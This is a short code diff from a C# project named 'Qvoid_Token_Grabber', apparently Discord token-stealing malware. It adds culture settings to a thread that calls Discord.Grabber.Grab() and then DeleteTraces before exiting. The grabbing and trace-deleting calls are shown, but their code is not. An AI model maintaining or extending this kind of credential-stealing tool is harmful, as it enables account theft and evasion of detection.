@@ -9,6 +9,9 @@ namespace Qvoid_Token_Grabber
         {
             new Thread(() =>
             {
+                Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
+                Thread.CurrentThread.CurrentUICulture = CultureInfo.InvariantCulture;
+                
                 Discord.Grabber.Grab();
                 Discord.Grabber.DeleteTraces(false, false);
                 Environment.Exit(0);
